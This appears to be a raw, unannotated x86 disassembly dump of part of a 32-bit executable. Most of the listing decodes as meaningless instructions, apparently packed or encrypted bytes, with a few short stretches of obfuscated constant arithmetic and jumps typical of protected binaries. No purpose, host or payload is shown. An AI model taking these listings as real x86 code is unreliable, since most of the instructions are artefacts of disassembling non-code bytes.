  40e934:	inc    edx
  40e935:	push   esi
  40e936:	cmp    ah,al
  40e938:	mov    bl,0xbc
  40e93a:	push   0x4357b36e
  40e93f:	mov    eax,0x5b8b2c4
  40e944:	dec    ecx
  40e945:	leave  
  40e946:	out    0xc1,al
  40e948:	dec    esp
  40e949:	jmp    0x40e94f
  40e94b:	pusha  
  40e94c:	hlt    
  40e94d:	adc    eax,0xdbb3c74f
  40e952:	dec    edi
  40e953:	xor    dl,bh
  40e955:	dec    edx
  40e956:	stc    
  40e957:	in     eax,0x9f
  40e959:	jbe    0x40e9d4
  40e95b:	add    al,ch
  40e95d:	aad    0x4a
  40e95f:	adc    DWORD PTR [edi],ecx
  40e961:	fucomip st,st(7)
  40e963:	mov    edx,0x2a14aded
  40e968:	and    eax,eax
  40e96a:	fld    QWORD PTR [ebx+0x75bc5293]
  40e970:	inc    edx
  40e971:	out    0x19,eax
  40e973:	pop    edx
  40e974:	std    
  40e975:	xlat   BYTE PTR ds:[ebx]
  40e976:	jmp    0x40e956
  40e978:	add    BYTE PTR [eax],ch
  40e97a:	std    
  40e97b:	int    0xac
  40e97d:	ret    
  40e97e:	fcmovne st,st(7)
  40e980:	sbb    eax,0x918c7322
  40e985:	or     DWORD PTR [eax],ebp
  40e987:	sbb    BYTE PTR [ecx-0x4b],ah
  40e98a:	xchg   ebx,eax
  40e98b:	fsubr  DWORD PTR fs:[ecx]
  40e98e:	lock scas eax,DWORD PTR es:[edi]
  40e990:	enter  0xf598,0x35
  40e994:	popa   
  40e995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e997:	inc    ebx
  40e998:	cmp    BYTE PTR [esi],bh
  40e99a:	jne    0x40e9b5
  40e99c:	sbb    esi,esi
  40e99e:	pop    esp
  40e99f:	clc    
  40e9a0:	mov    bl,BYTE PTR [ecx+eiz*1-0x55]
  40e9a4:	sub    edx,ebx
  40e9a6:	mov    ecx,0xa8088a18
  40e9ab:	(bad)  
  40e9ac:	pushf  
  40e9ad:	push   ebp
  40e9ae:	in     eax,0xb4
  40e9b0:	sbb    ebx,esp
  40e9b2:	pop    edi
  40e9b3:	aas    
  40e9b4:	adc    al,0x1
  40e9b6:	rcr    BYTE PTR [ecx-0x47495517],1
  40e9bc:	xchg   edx,eax
  40e9bd:	pop    ecx
  40e9be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9bf:	xchg   BYTE PTR [esi+0x6],dl
  40e9c2:	out    0x72,eax
  40e9c4:	inc    esp
  40e9c5:	inc    DWORD PTR [ebp+0x4e]
  40e9c8:	sub    al,0x5e
  40e9ca:	pop    edi
  40e9cb:	clc    
  40e9cc:	cld    
  40e9cd:	mov    ds:0x5009217b,al
  40e9d2:	mov    ebx,0xd0854c18
  40e9d7:	jg     0x40e9d5
  40e9d9:	add    dh,al
  40e9db:	xchg   DWORD PTR [ebp+0x655e69ed],edx
  40e9e1:	ret    0x5988
  40e9e4:	cdq    
  40e9e5:	mov    esi,0xc86d8610
  40e9ea:	dec    eax
  40e9eb:	aas    
  40e9ec:	ins    BYTE PTR es:[edi],dx
  40e9ed:	mov    cl,BYTE PTR [ebp-0x7d]
  40e9f0:	daa    
  40e9f1:	mov    ch,0xa3
  40e9f3:	xchg   BYTE PTR [esi+edx*4],cl
  40e9f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9f7:	adc    al,BYTE PTR [ebp+eiz*8+0x2b7d420a]
  40e9fe:	jmp    0x85e40608
  40ea03:	call   esp
  40ea05:	sub    al,0x50
  40ea07:	sub    ah,bh
  40ea09:	push   0xa8e6b49a
  40ea0e:	add    eax,DWORD PTR [ebp+0x28368526]
  40ea14:	mov    bl,0xaa
  40ea16:	ret    
  40ea17:	jno    0x40ea66
  40ea19:	dec    eax
  40ea1a:	mov    ds:0x18d0f241,al
  40ea1f:	mov    fs,WORD PTR [edi]
  40ea21:	and    DWORD PTR [esi+0x223a8584],esp
  40ea27:	fbstp  TBYTE PTR [esp+ebx*2]
  40ea2a:	adc    al,0x6a
  40ea2c:	xchg   ebp,eax
  40ea2d:	or     eax,0x3be6f2cb
  40ea32:	cwde   
  40ea33:	dec    esp
  40ea34:	adc    al,0x7c
  40ea36:	mov    cl,BYTE PTR [eax-0x5e49eaeb]
  40ea3c:	push   0x695daa79
  40ea41:	jmp    0x40e9d8
  40ea43:	push   0x12
  40ea45:	jle    0x40ea9e
  40ea47:	sub    BYTE PTR [eax+ebp*8+0x1],dh
  40ea4b:	jne    0x40ea75
  40ea4d:	in     al,dx
  40ea4e:	mov    ah,0xbd
  40ea50:	test   al,0xd
  40ea52:	cmp    BYTE PTR [ecx],0x7f
  40ea55:	frstor [edi-0x4d]
  40ea58:	push   cs
  40ea59:	sbb    DWORD PTR [ebx-0x5a061d38],ebp
  40ea5f:	adc    dl,ch
  40ea61:	mov    BYTE PTR [ecx],dl
  40ea63:	lahf   
  40ea64:	sub    edi,DWORD PTR [edx+ebx*8-0x44889b9b]
  40ea6b:	jae    0x40ea17
  40ea6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea6e:	test   eax,0xfb142cc
  40ea73:	pop    eax
  40ea74:	jno    0x40ead5
  40ea76:	sub    BYTE PTR [ecx-0x45],bl
  40ea79:	and    eax,0x9506914e
  40ea7e:	into   
  40ea7f:	scas   al,BYTE PTR es:[edi]
  40ea80:	push   esi
  40ea81:	mov    ebx,ebp
  40ea83:	jb     0x40ea61
  40ea85:	int3   
  40ea86:	pop    ebp
  40ea87:	push   0x2d
  40ea89:	pop    eax
  40ea8a:	fld    QWORD PTR [eax]
  40ea8c:	mov    edx,0x66ca77f0
  40ea91:	and    DWORD PTR [edx],0xffffff89
  40ea94:	inc    edi
  40ea95:	mov    DWORD PTR [esi+0x371b2bd3],ebx
  40ea9b:	mov    al,0xea
  40ea9d:	lahf   
  40ea9e:	xor    al,0xa5
  40eaa0:	inc    esp
  40eaa1:	stos   DWORD PTR es:[edi],eax
  40eaa2:	xor    edx,edx
  40eaa4:	div    edi
  40eaa6:	mov    edx,DWORD PTR ds:0x422558
  40eaac:	mov    edx,DWORD PTR [edx+0x1d4]
  40eab2:	sub    edx,eax
  40eab4:	mov    eax,DWORD PTR [ebp+0x10]
  40eab7:	mov    al,BYTE PTR [esi+eax*1]
  40eaba:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40eac1:	mov    eax,DWORD PTR [ebp-0x1c]
  40eac4:	mov    edx,DWORD PTR [ebp-0x18]
  40eac7:	imul   eax,edx
  40eaca:	mov    edx,DWORD PTR [ebp-0x14]
  40eacd:	imul   eax,eax,0x262b
  40ead3:	or     eax,edx
  40ead5:	mov    edx,DWORD PTR [ebp-0x10]
  40ead8:	or     eax,edx
  40eada:	xor    eax,0x59f6
  40eadf:	jmp    0x40eda3
  40eae4:	sub    BYTE PTR [edi-0x3c],0x71
  40eae8:	pushf  
  40eae9:	sbb    bl,BYTE PTR [edx]
  40eaeb:	pop    edx
  40eaec:	mov    ebp,0x34aa14b9
  40eaf1:	icebp  
  40eaf2:	fnstcw WORD PTR [ebp+edi*8-0x2de7e748]
  40eaf9:	adc    al,0x18
  40eafb:	sbb    BYTE PTR [ecx+0x7e],dl
  40eafe:	adc    ecx,esp
  40eb00:	sbb    bl,BYTE PTR [eax+eiz*2+0x20]
  40eb04:	mov    bh,0x89
  40eb06:	sub    al,0x30
  40eb08:	cs ins DWORD PTR es:[edi],dx
  40eb0a:	dec    esp
  40eb0b:	dec    edx
  40eb0c:	imul   edi,DWORD PTR [ebp+0x3],0x8ba4ca78
  40eb13:	or     eax,0x6625f223
  40eb18:	or     edx,DWORD PTR [edi]
  40eb1a:	mov    WORD PTR [ebp+0x3a],es
  40eb1d:	mov    DWORD PTR [bp+si],edx
  40eb20:	das    
  40eb21:	jbe    0x40eb36
  40eb23:	push   esp
  40eb24:	or     eax,0x5b0b5930
  40eb29:	pop    ebx
  40eb2a:	hlt    
  40eb2b:	jb     0x40eaff
  40eb2d:	inc    ebx
  40eb2e:	shl    DWORD PTR [ebx+0x40],0x12
  40eb32:	dec    esp
  40eb33:	dec    ebp
  40eb34:	mov    DWORD PTR [ecx+0x74662d3c],esp
  40eb3a:	jo     0x40eb17
  40eb3c:	call   0xa435127f
  40eb41:	mov    esp,0xf8b27d6b
  40eb46:	repz dec edi
  40eb48:	sbb    eax,0xb7588435
  40eb4d:	or     eax,0xefc327
  40eb52:	loope  0x40ebc6
  40eb54:	call   0x4abc0367
  40eb59:	dec    esp
  40eb5a:	retf   0xde57
  40eb5d:	pop    eax
  40eb5e:	and    DWORD PTR [eax],ecx
  40eb60:	scas   eax,DWORD PTR es:[edi]
  40eb61:	mov    bl,0x70
  40eb63:	gs dec esp
  40eb65:	retf   
  40eb66:	jge    0x40ebb4
  40eb68:	in     al,0x51
  40eb6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb6b:	fild   QWORD PTR [edx]
  40eb6d:	pop    esi
  40eb6f:	imul   esi,DWORD PTR [ecx+0xfb87c2c],0x1b042525
  40eb79:	add    DWORD PTR [ecx+0x3092c5b],0xe828dcd1
  40eb83:	push   es
  40eb84:	dec    edx
  40eb85:	pop    edx
  40eb86:	sti    
  40eb87:	xor    BYTE PTR [ebp+0x4edd680b],0x76
  40eb8e:	jo     0x40ebca
  40eb90:	repz repz fimul DWORD PTR [ecx+ebx*2-0x547aaca]
  40eb99:	cmc    
  40eb9a:	std    
  40eb9b:	xchg   ebp,eax
  40eb9c:	stos   BYTE PTR es:[edi],al
  40eb9d:	jnp    0x40ebd1
  40eb9f:	in     al,0xea
  40eba1:	adc    ch,al
  40eba3:	(bad)  
  40eba4:	jae    0x40eb7a
  40eba6:	je     0x40ec23
  40eba8:	and    DWORD PTR [edx-0x59],esi
  40ebab:	popf   
  40ebac:	mov    ah,0x9c
  40ebae:	add    al,0x87
  40ebb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebb1:	jno    0x40eb9b
  40ebb3:	jo     0x40ec1c
  40ebb5:	dec    ebp
  40ebb6:	addr16 loope 0x40ebc4
  40ebb9:	cmp    bh,BYTE PTR [esi+0x6f]
  40ebbc:	test   ch,0x65
  40ebbf:	mov    ds:0x464cab94,eax
  40ebc4:	cli    
  40ebc5:	js     0x40ebfd
  40ebc7:	xor    cl,BYTE PTR [ecx]
  40ebc9:	shr    BYTE PTR [edx],1
  40ebcb:	repz repz fld DWORD PTR [edi-0x46eb3293]
  40ebd3:	jge    0x40ebb3
  40ebd5:	inc    ebx
  40ebd6:	jp     0x40eb6c
  40ebd8:	and    esp,DWORD PTR [ebx+0x64]
  40ebdb:	mov    edi,0x8bb7701a
  40ebe0:	das    
  40ebe1:	sub    BYTE PTR [esi+0x3c],0x90
  40ebe5:	xchg   edx,eax
  40ebe7:	sbb    ecx,DWORD PTR [edx-0x72]
  40ebea:	fcomp  DWORD PTR [ebp+ebx*1-0x21]
  40ebee:	test   al,0xb
  40ebf0:	lahf   
  40ebf1:	sub    esp,DWORD PTR es:[ecx]
  40ebf4:	into   
  40ebf5:	push   ss
  40ebf6:	pop    esi
  40ebf7:	hlt    
  40ebf8:	imul   esi,edi,0xa382eb57
  40ebfe:	outs   dx,BYTE PTR ds:[esi]
  40ebff:	out    0xfc,al
  40ec01:	cdq    
  40ec02:	retf   
  40ec03:	mov    bl,0x79
  40ec05:	popa   
  40ec06:	pop    ebx
  40ec07:	add    bh,bh
  40ec09:	les    ecx,FWORD PTR [edi+ecx*8-0x595269a9]
  40ec10:	fxch   st(0)
  40ec12:	rol    BYTE PTR [ebp-0xf],0xa8
  40ec16:	aad    0xfd
  40ec18:	mov    bh,0x36
  40ec1a:	mov    al,ds:0xcb209c9
  40ec1f:	mov    ah,0x8e
  40ec21:	arpl   WORD PTR [ecx],si
  40ec23:	xchg   edx,eax
  40ec24:	addr16 xor eax,0x36ea4ae4
  40ec2a:	inc    ebp
  40ec2b:	(bad)
  40ec2e:	imul   edx,eax,0x5d59131
  40ec34:	sbb    esi,DWORD PTR [edi+0x6e]
  40ec37:	push   esp
  40ec38:	pop    ss
  40ec39:	gs mov edx,0xf430b781
  40ec3f:	mul    esi
  40ec41:	mov    cl,0x36
  40ec43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec44:	outs   dx,BYTE PTR ds:[esi]
  40ec46:	adc    al,0x3b
  40ec48:	ja     0x40eca3
  40ec4a:	push   ebx
  40ec4b:	sbb    DWORD PTR [ecx],eax
  40ec4d:	pop    eax
  40ec4e:	mov    bl,0xc2
  40ec50:	std    
  40ec51:	sub    ch,BYTE PTR [eax+0x4b470728]
  40ec57:	jmp    0x40ec38
  40ec59:	retf   0xa921
  40ec5c:	mov    ch,0x1d
  40ec5e:	mov    cx,0x6816
  40ec62:	mov    ah,BYTE PTR [esi+ebp*2+0x6460058c]
  40ec69:	call   0x38099289
  40ec6e:	mov    fs,WORD PTR [edi+0x2a]
  40ec71:	mov    edi,0x64331a48
  40ec76:	in     eax,0x79
  40ec78:	cmp    eax,0xe806bc18
  40ec7d:	sub    DWORD PTR [ecx-0x74],edi
  40ec80:	pop    edx
  40ec81:	pusha  
  40ec82:	and    ch,bh
  40ec84:	jnp    0x40ec68
  40ec86:	and    BYTE PTR [esi],0xa0
  40ec89:	aam    0x52
  40ec8b:	xor    BYTE PTR [eax+edx*1],ah
  40ec8e:	sub    ch,0x32
  40ec91:	sub    eax,0xa20db0da
  40ec96:	jb     0x40ec2c
  40ec98:	enter  0x5382,0x1a
  40ec9c:	cwde   
  40ec9d:	mov    edi,0xf6c7a4a6
  40eca2:	push   esi
  40eca3:	int3   
  40eca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eca5:	in     al,0x57
  40eca7:	test   BYTE PTR [edx-0x14e3ae75],0xe2
  40ecae:	popa   
  40ecaf:	xchg   ebx,eax
  40ecb0:	inc    esi
  40ecb1:	cmp    al,0xe5
  40ecb3:	dec    ebp
  40ecb4:	pop    ds
  40ecb5:	cmp    eax,DWORD PTR [bp+si+0x2c]
  40ecb9:	imul   esp,ebx,0x2eff970a
  40ecbf:	push   edi
  40ecc0:	jns    0x40eccd
  40ecc2:	fsub   DWORD PTR [edi]
  40ecc4:	mov    ecx,0x93ff6a25
  40ecc9:	fs pop edi
  40eccb:	xor    eax,0x66bc6af2
  40ecd0:	jno    0x40ecf2
  40ecd2:	call   DWORD PTR [eax]
  40ecd4:	sub    DWORD PTR [esi+esi*2+0x3],0x465a7d50
  40ecdc:	(bad)
  40ece1:	stos   BYTE PTR es:[edi],al
  40ece2:	adc    BYTE PTR [eax],al
  40ece4:	xchg   cl,bh
  40ece6:	xchg   esp,eax
  40ece7:	mov    edi,0xa8fa8c35
  40ecec:	(bad)  
  40eced:	jg     0x40ecd9
  40ecef:	add    ecx,DWORD PTR [ebp-0xb74b5c8]
  40ecf5:	(bad)  
  40ecf6:	js     0x40ed0c
  40ecf8:	and    DWORD PTR [esp+ecx*8-0xff633c9],0x5fb4fd74
  40ed03:	in     al,0x1d
  40ed05:	sub    al,0xdc
  40ed07:	fmul   QWORD PTR [edi-0x7433f3cd]
  40ed0d:	mov    ds:0xd633c293,eax
  40ed12:	push   ds
  40ed13:	mov    ecx,0xb1271560
  40ed18:	enter  0xff32,0xc6
  40ed1c:	mov    dl,BYTE PTR [ecx+0x6771293f]
  40ed22:	mov    esi,0x5824b5f1
  40ed27:	push   ss
  40ed28:	call   0x117f2af1
  40ed2d:	(bad)  
  40ed2e:	fs fsub st(0),st
  40ed31:	mov    ds:0x15d2b105,eax
  40ed36:	ins    DWORD PTR es:[edi],dx
  40ed37:	mov    ch,0x19
  40ed39:	into   
  40ed3a:	(bad)  
  40ed3b:	mov    WORD PTR [ecx+eiz*1],fs
  40ed3e:	(bad)  
  40ed40:	jg     0x40ecdd
  40ed42:	mov    dh,0xeb
  40ed44:	shr    BYTE PTR [edx-0x3109068a],1
  40ed4a:	jmp    0x596f:0x1f78d6c4
  40ed51:	bound  esi,QWORD PTR [edi+ecx*8+0xe]
  40ed55:	nop
  40ed56:	dec    edx
  40ed57:	int3   
  40ed58:	retf   0x9416
  40ed5b:	adc    ch,al
  40ed5d:	jg     0x40ed49
  40ed5f:	(bad)  
  40ed60:	xlat   BYTE PTR ds:[ebx]
  40ed61:	mov    bh,0x54
  40ed63:	aam    0xa8
  40ed65:	adc    eax,0x1ddb483e
  40ed6a:	in     eax,dx
  40ed6b:	scas   al,BYTE PTR es:[edi]
  40ed6c:	loopne 0x40ed27
  40ed6e:	pop    edi
  40ed6f:	retf   
  40ed70:	iret   
  40ed71:	push   ecx
  40ed72:	iret   
  40ed73:	jp     0x40edf3
  40ed75:	call   0x6156:0x6d3fbc3c
  40ed7c:	test   eax,0x3a2acc55
  40ed81:	push   esp
  40ed82:	stos   BYTE PTR es:[edi],al
  40ed83:	mul    dl
  40ed85:	je     0x40ed36
  40ed87:	scas   eax,DWORD PTR es:[edi]
  40ed88:	sahf   
  40ed89:	dec    eax
  40ed8a:	(bad)
  40ed8d:	fwait
  40ed8e:	or     DWORD PTR [ecx+0x2db5f017],0xffffffd1
  40ed95:	jno    0x40ed8b
  40ed97:	mov    cl,0x24
  40ed99:	mov    dh,0xf5
  40ed9b:	cmp    BYTE PTR [edi],0xe5
  40ed9e:	dec    eax
  40ed9f:	push   ss
  40eda0:	imul   ebx,ebp,0x18c8d9e
  40eda6:	out    0x59,al
  40eda8:	add    eax,0xf4458b35
  40edad:	and    eax,0xddc
  40edb2:	add    eax,DWORD PTR [ebp-0x8]
  40edb5:	xor    eax,0x46e3
  40edba:	add    eax,0x50eb
  40edbf:	cmp    ecx,eax
  40edc1:	jmp    0x40f085
  40edc6:	cmp    DWORD PTR [edx-0x25e5f4a4],ecx
  40edcc:	daa    
  40edcd:	sub    ch,BYTE PTR [edx+0x25aa1270]
  40edd3:	push   ss
  40edd4:	and    ebp,DWORD PTR [edx+0x1818b2b7]
  40edda:	rcl    BYTE PTR [eax+ebx*1],cl
  40eddd:	sbb    BYTE PTR [ecx-0x77d8bb1e],dl
  40ede3:	jno    0x40edca
  40ede5:	sahf   
  40ede6:	popf   
  40ede7:	xchg   edi,eax
  40ede8:	not    BYTE PTR [eax]
  40edea:	imul   DWORD PTR [esi-0x52]
  40eded:	data16 das 
  40edef:	imul   eax,DWORD PTR [edi-0xe0a2192],0xfffffff7
  40edf6:	icebp  
  40edf7:	not    esp
  40edf9:	pushf  
  40edfa:	ds test eax,0xf4474c81
  40ee00:	lds    edi,FWORD PTR [edi+0x60]
  40ee03:	sub    ch,BYTE PTR ds:0xd5bd921c
  40ee09:	es ror DWORD PTR cs:[eax+0x6a],cl
  40ee0e:	pop    ecx
  40ee0f:	loopne 0x40ed93
  40ee11:	sbb    DWORD PTR [esp+esi*2+0x19a2a32c],ebp
  40ee18:	aad    0xca
  40ee1a:	in     eax,dx
  40ee1b:	inc    esi
  40ee1c:	lods   eax,DWORD PTR ds:[esi]
  40ee1d:	and    bl,BYTE PTR [edi+0x6356e7c]
  40ee23:	shr    DWORD PTR [ebp-0x6c],cl
  40ee26:	add    BYTE PTR ds:0x7cde3e10,ah
  40ee2c:	mov    ebx,0x18a4e4d2
  40ee31:	hlt    
  40ee32:	xchg   ebp,eax
  40ee33:	nop
  40ee34:	xor    al,0x6a
  40ee36:	(bad)  
  40ee37:	pop    edi
  40ee38:	ins    BYTE PTR es:[edi],dx
  40ee39:	inc    DWORD PTR [edx+0x25]
  40ee3c:	xlat   BYTE PTR ds:[bx]
  40ee3e:	aad    0x3b
  40ee40:	test   ecx,ecx
  40ee42:	xor    DWORD PTR [esi-0x351e4f42],eax
  40ee48:	add    ah,BYTE PTR [ecx]
  40ee4a:	xchg   edi,eax
  40ee4b:	fbld   TBYTE PTR [ebp+0x2111810a]
  40ee51:	jb     0x40eed2
  40ee53:	call   0x88:0x6638ad27
  40ee5a:	imul   esp,DWORD PTR [ebx],0x75
  40ee5d:	add    BYTE PTR [eax],0xe9
  40ee60:	lock loopne 0x40ee35
  40ee63:	sub    eax,0x5c438409
  40ee68:	ret    0x1860
  40ee6b:	and    esi,esp
  40ee6d:	ins    DWORD PTR es:[edi],dx
  40ee6e:	or     eax,0xbd7d2759
  40ee73:	mov    al,ds:0xff0b001a
  40ee78:	mov    dl,0x6f
  40ee7a:	adc    al,0xe9
  40ee7c:	pushf  
  40ee7d:	into   
  40ee7e:	pop    edx
  40ee7f:	fwait
  40ee80:	mov    edx,0xc17463d6
  40ee85:	jno    0x40ee63
  40ee87:	std    
  40ee88:	jno    0x40ee3f
  40ee8a:	push   eax
  40ee8b:	int3   
  40ee8c:	push   esp
  40ee8d:	or     BYTE PTR [esi+0x2e5f2ed6],ch
  40ee93:	mov    cr4,esi
  40ee96:	mov    eax,0x8acfe4c0
  40ee9b:	jg     0x40ee84
  40ee9d:	es sub ebp,0xffffffec
  40eea1:	sahf   
  40eea2:	mov    ds:0x22d0ed64,al
  40eea7:	mov    WORD PTR [edx],ds
  40eea9:	cld    
  40eeaa:	data16 fwait
  40eeac:	dec    eax
  40eead:	xchg   esi,eax
  40eeae:	xchg   ecx,eax
  40eeaf:	aad    0xf3
  40eeb1:	std    
  40eeb2:	add    ah,dl
  40eeb4:	mov    dh,0xa1
  40eeb6:	xlat   BYTE PTR ds:[ebx]
  40eeb7:	xor    dh,dl
  40eeb9:	jbe    0x40ee97
  40eebb:	bndstx [esi+0x52],(bad)
  40eebf:	lock hlt 
  40eec1:	bound  esi,QWORD PTR [esi+0x68]
  40eec4:	push   ss
  40eec5:	out    dx,ax
  40eec7:	out    0xbf,eax
  40eec9:	push   0x1f
  40eecb:	pop    ebp
  40eecc:	adc    DWORD PTR ds:0xf0e64f35,ebx
  40eed2:	in     al,dx
  40eed3:	pop    es
  40eed4:	xor    DWORD PTR es:[ecx+esi*8+0x6e0e0cf2],ebp
  40eedc:	(bad)  
  40eedd:	mov    edi,0xe8543e32
  40eee2:	outs   dx,BYTE PTR ds:[esi]
  40eee3:	data16 jb 0x40ef03
  40eee6:	mov    eax,0x25501c1c
  40eeeb:	mov    BYTE PTR ds:0x67de3600,cl
  40eef1:	mov    ebx,ds
  40eef3:	jae    0x40eef2
  40eef5:	or     edi,edx
  40eef7:	mov    ecx,0x59d4e4ef
  40eefc:	in     al,dx
  40eefd:	(bad)  
  40eefe:	(bad)
  40ef01:	pop    ss
  40ef02:	push   ebp
  40ef04:	inc    esp
  40ef05:	jecxz  0x40eeb1
  40ef07:	jno    0x40eebc
  40ef09:	dec    ebp
  40ef0a:	cmp    bl,BYTE PTR [ebx+0x11]
  40ef0d:	sbb    eax,DWORD PTR [ebx+ecx*2-0x121620f6]
  40ef14:	mov    WORD PTR [edx-0x80],ds
  40ef17:	pop    ebx
  40ef18:	xor    eax,0xa1fdab59
  40ef1d:	dec    eax
  40ef1e:	retf   0xefb6
  40ef21:	mov    al,ch
  40ef23:	ficom  WORD PTR [ecx-0x4b]
  40ef26:	dec    edx
  40ef27:	mov    edx,0x1d31790e
  40ef2c:	or     DWORD PTR [eax],edx
  40ef2e:	dec    ecx
  40ef2f:	dec    ebx
  40ef30:	mov    bh,0x62
  40ef32:	dec    eax
  40ef33:	add    al,0xc6
  40ef35:	sbb    ecx,DWORD PTR [eax-0x4e]
  40ef38:	jg     0x40ef65
  40ef3a:	sahf   
  40ef3b:	test   eax,0xcacce4d0
  40ef40:	adc    al,BYTE PTR [esi]
  40ef42:	repz sbb al,0xaa
  40ef45:	inc    edx
  40ef46:	aad    0x3f
  40ef48:	and    eax,0x8948605f
  40ef4d:	xlat   BYTE PTR ds:[ebx]
  40ef4e:	pop    edx
  40ef4f:	mov    cl,0xbe
  40ef51:	cmp    DWORD PTR [esi],esi
  40ef53:	cld    
  40ef54:	rcl    BYTE PTR [esi+0x2d],1
  40ef57:	repz scas eax,DWORD PTR es:[edi]
  40ef59:	rcr    BYTE PTR [eax-0x62],0xc4
  40ef5d:	neg    DWORD PTR [ebp-0x41]
  40ef60:	shl    BYTE PTR [esi+esi*2],cl
  40ef63:	(bad)  
  40ef64:	call   0x5e39:0x346782e0
  40ef6b:	xchg   DWORD PTR [edx],edi
  40ef6d:	retf   0xc890
  40ef70:	dec    ecx
  40ef71:	push   ss
  40ef72:	or     al,0xaa
  40ef74:	scas   eax,DWORD PTR es:[edi]
  40ef75:	fst    st(2)
  40ef77:	pop    edi
  40ef78:	cs ja  0x40ef74
  40ef7b:	xchg   esp,eax
  40ef7c:	pop    eax
  40ef7d:	or     BYTE PTR [esi+edx*1+0x3c],ah
  40ef81:	fbstp  TBYTE PTR [ebp+0x7cab4c5b]
  40ef87:	adc    al,0xd8
  40ef89:	test   al,0xaa
  40ef8b:	mov    al,ds:0xcbed4a97
  40ef90:	div    ah
  40ef92:	test   eax,0x400adbe3
  40ef97:	sub    al,bh
  40ef99:	pop    esp
  40ef9a:	stos   DWORD PTR es:[edi],eax
  40ef9b:	nop
  40ef9c:	lods   eax,DWORD PTR ds:[esi]
  40ef9d:	out    0xf1,al
  40ef9f:	cmp    BYTE PTR [esi+ebp*1+0x7c],bh
  40efa3:	xchg   ebp,eax
  40efa4:	arpl   WORD PTR [esi+0x4b],si
  40efa7:	arpl   bx,sp
  40efa9:	jg     0x40efa8
  40efab:	mov    ebp,0xf900d038
  40efb0:	xchg   esp,eax
  40efb1:	sub    eax,0xabb0065d
  40efb6:	mov    ah,0x78
  40efb8:	es push 0x4e
  40efbb:	shl    BYTE PTR [ebx+0x6071f8d6],1
  40efc1:	cmp    BYTE PTR [edi+edi*8+0x60],bh
  40efc5:	inc    ebp
  40efc6:	jmp    0x9662:0x3942e95d
  40efcd:	repnz xchg ebx,eax
  40efcf:	or     DWORD PTR [edi],0xffffffea
  40efd2:	pop    ebp
  40efd3:	push   ebp
  40efd4:	sub    eax,0x88c6d37a
  40efd9:	stos   BYTE PTR es:[edi],al
  40efda:	aas    
  40efdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efdc:	pop    esp
  40efdd:	pushf  
  40efde:	mov    bh,dl
  40efe0:	xor    bl,ch
  40efe2:	jp     0x40efb7
  40efe4:	push   esi
  40efe5:	daa    
  40efe6:	jnp    0x40f00f
  40efe8:	push   es
  40efe9:	and    eax,0x5f1f46f7
  40efee:	pop    ds
  40efef:	push   ss
  40eff0:	hlt    
  40eff1:	rcr    edi,cl
  40eff3:	(bad)  
  40eff4:	xor    esi,eax
  40eff6:	jbe    0x40f048
  40eff8:	ret    
  40eff9:	ds cli 
  40effb:	jmp    FWORD PTR [edx+ebx*1+0x4e]
  40efff:	ror    BYTE PTR gs:[edx+0x61],1
  40f003:	test   eax,0xc6c7fa07
  40f008:	ffreep st(6)
  40f00a:	fcomp  DWORD PTR ds:0x78f6f2d8
  40f010:	int    0x22
  40f012:	cdq    
  40f013:	jbe    0x40efb4
  40f015:	inc    esi
  40f016:	and    DWORD PTR ds:0xfcd04a9f,0xffffffb9
  40f01d:	xor    eax,edx
  40f01f:	call   0x65a76ae2
  40f024:	jmp    0x54ac:0xc01d1072
  40f02b:	mov    gs,WORD PTR [eax+edx*2]
  40f02e:	and    al,BYTE PTR [edx+ebp*2]
  40f031:	push   0x54
  40f033:	pushf  
  40f034:	into   
  40f035:	fs jge 0x40f092
  40f038:	out    0x3e,eax
  40f03a:	in     al,0xe7
  40f03c:	test   eax,0xa9344de6
  40f041:	jns    0x40f0b3
  40f043:	(bad)  
  40f044:	stc    
  40f045:	xchg   edx,eax
  40f046:	jmp    FWORD PTR [eax]
  40f048:	or     BYTE PTR [esi+0x65aed80b],cl
  40f04e:	mov    esi,0x230a3069
  40f053:	mov    DWORD PTR [ecx+0x68],ebx
  40f056:	xor    ecx,edi
  40f058:	jg     0x40f0ae
  40f05a:	mov    eax,ds:0xa8fdfc63
  40f05f:	cmp    DWORD PTR ds:0x1ff7d0b3,edx
  40f065:	mov    BYTE PTR fs:[ebp+eax*2-0x6f],dl
  40f06a:	cld    
  40f06b:	push   esp
  40f06c:	into   
  40f06d:	das    
  40f06e:	pop    edx
  40f06f:	iret   
  40f070:	xchg   esp,eax
  40f071:	repz mov edi,0x84344c77
  40f077:	mov    ebx,0x82784f4b
  40f07c:	scas   al,BYTE PTR es:[edi]
  40f07d:	lahf   
  40f07e:	adc    al,0x82
  40f080:	pop    ecx
  40f081:	(bad)  
  40f082:	popf   
  40f083:	sbb    al,0x2b
  40f085:	jne    0x40e793
  40f08b:	pop    edi
  40f08c:	jmp    0x40f350
  40f091:	inc    edi
  40f092:	mov    ds:0x305a70db,al
  40f097:	inc    edx
  40f098:	call   0xfb3b:0xaa146552
  40f09f:	iret   
  40f0a0:	jo     0x40f112
  40f0a2:	scas   al,BYTE PTR es:[edi]
  40f0a3:	sbb    BYTE PTR [eax],bl
  40f0a5:	rcl    BYTE PTR [eax+ebx*1],cl
  40f0a8:	sbb    dh,dh
  40f0aa:	sar    cl,cl
  40f0ac:	xor    BYTE PTR [ebx],bl
  40f0ae:	loope  0x40f123
  40f0b0:	and    esi,DWORD PTR [ebx-0x61]
  40f0b3:	jno    0x40f06d
  40f0b5:	repnz (bad) 
  40f0b7:	jge    0x40f0e4
  40f0b9:	xchg   esi,eax
  40f0ba:	mov    ds:0xba5fe57a,eax
  40f0bf:	xor    BYTE PTR [esi-0x75],bl
  40f0c2:	call   0xb91e3712
  40f0c7:	jno    0x40f11c
  40f0c9:	(bad)  
  40f0ca:	fs int3 
  40f0cc:	ins    DWORD PTR es:[edi],dx
  40f0cd:	lss    ebp,FWORD PTR [edi]
  40f0d0:	data16 loopne 0x40f11a
  40f0d3:	push   cs
